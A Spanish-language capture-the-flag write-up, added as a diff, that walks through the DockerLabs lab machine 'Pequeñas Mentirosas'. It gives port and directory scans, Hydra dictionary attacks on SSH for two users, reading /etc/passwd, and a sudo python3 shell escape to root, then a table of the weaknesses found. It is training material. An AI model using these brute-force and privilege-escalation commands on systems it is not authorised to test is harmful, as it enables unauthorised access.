@@ -1,0 +1,208 @@
+---
+title: Pequeñas Mentirosas
+description: Resolución completa de la máquina virtual *Pequeñas Mentirosas* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Pequeñas Mentirosas**, desarrollada por *beafn28* para la plataforma **DockerLabs**, clasificada con una dificultad **Fácil**.
+El laboratorio expone un servidor web con una pista en el código fuente que sugiere la existencia de un usuario llamado `a`. Mediante un ataque de fuerza bruta con Hydra, se obtiene acceso SSH a este usuario. Una vez dentro, la enumeración del archivo `/etc/passwd` revela un segundo usuario, `spencer`, al que también se accede por fuerza bruta.
+Finalmente, se identifica una configuración insegura de `sudo` que permite ejecutar `python3` como root sin autenticación, facilitando la escalada de privilegios y obteniendo acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Pequeñas Mentirosas',
+    Autor: 'beafn28',
+    Dificultad: 'Fácil',
+    Fecha: '26/09/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Pequenas-Mentirosas.zip
+sudo bash auto_deplo.sh Pequenas-Mentirosas.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1748411786/ipScan_skcisu.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Pequenas-Mentirosas/{content,exploits,nmap,scripts}
+cd Pequenas-Mentirosas
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **22/tcp** — SSH
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1749626705/Ports_lxfb1h.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p22,80 172.17.0.2 -oN targeted
+```
+
+![Servicios](https://res.cloudinary.com/dewqswzke/image/upload/v1749626705/Services_juv4ia.png)
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios para encontrar posibles endpoints en el servicio del puerto 80:
+
+```bash
+gobuster dir -u http://172.17.0.2/ \
+  -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt \
+  -x php,html,txt,js -t 200
+```
+
+![Gobuster](https://res.cloudinary.com/dewqswzke/image/upload/v1749626704/Gobuster_qa2lyt.png)
+
+Solo se detecta el archivo `index.php`, que contiene una pista:
+
+![Index](https://res.cloudinary.com/dewqswzke/image/upload/v1749626704/index_rfuajt.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Fuerza bruta SSH al usuario `a`
+
+Con la pista que sugiere la existencia del usuario `a`, se realiza un ataque de fuerza bruta con Hydra:
+
+```bash
+hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
+```
+
+![Hydra](https://res.cloudinary.com/dewqswzke/image/upload/v1749626905/Hydra_ehpyax.png)
+
+Se obtiene la contraseña y se accede al sistema:
+
+```bash
+ssh a@172.17.0.2
+```
+
+![SSH](https://res.cloudinary.com/dewqswzke/image/upload/v1749626707/Shh_us6wcj.png)
+
+### 2.2 Fuerza bruta SSH al usuario `spencer`
+
+Se revisa el archivo `/etc/passwd` y se identifica un segundo usuario: `spencer`:
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1749626705/Passwd_qdpjw1.png)
+
+Se repite el ataque de fuerza bruta:
+
+```bash
+hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 4
+```
+
+![Hydra2](https://res.cloudinary.com/dewqswzke/image/upload/v1749626904/Hydra2_pqs0aj.png)
+
+Se accede como `spencer`:
+
+```bash
+ssh spencer@172.17.0.2
+```
+
+![Spencer](https://res.cloudinary.com/dewqswzke/image/upload/v1749626707/Spencer_rheebp.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De spencer → root
+
+Se verifican los permisos sudo:
+
+```bash
+sudo -l
+```
+
+![Sudo -l](https://res.cloudinary.com/dewqswzke/image/upload/v1749626707/Sudo-l_svvbg6.png)
+
+El usuario puede ejecutar `python3` como root sin contraseña.
+
+Se utiliza `searchbins` para verificar la técnica en GTFOBins:
+
+```bash
+searchbins -b python -f sudo
+```
+
+Se ejecuta el siguiente comando para obtener una shell con privilegios de root:
+
+```bash
+sudo python3 -c 'import os; os.system("/bin/bash")'
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1749626705/Root_v1fnuv.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Contraseñas débiles en usuarios del sistema",
+      severity: "Crítica",
+      impact: "Acceso no autorizado mediante fuerza bruta"
+    },
+    {
+      vulnerability: "Exposición de pistas sobre usuarios en código fuente web",
+      severity: "Media",
+      impact: "Identificación de usuarios válidos para ataques"
+    },
+    {
+      vulnerability: "Falta de protección contra fuerza bruta en SSH",
+      severity: "Alta",
+      impact: "Ataques de diccionario ilimitados"
+    },
+    {
+      vulnerability: "Configuración insegura de sudo en python3",
+      severity: "Crítica",
+      impact: "Escalada de privilegios a root"
+    }
+  ]}
+/>
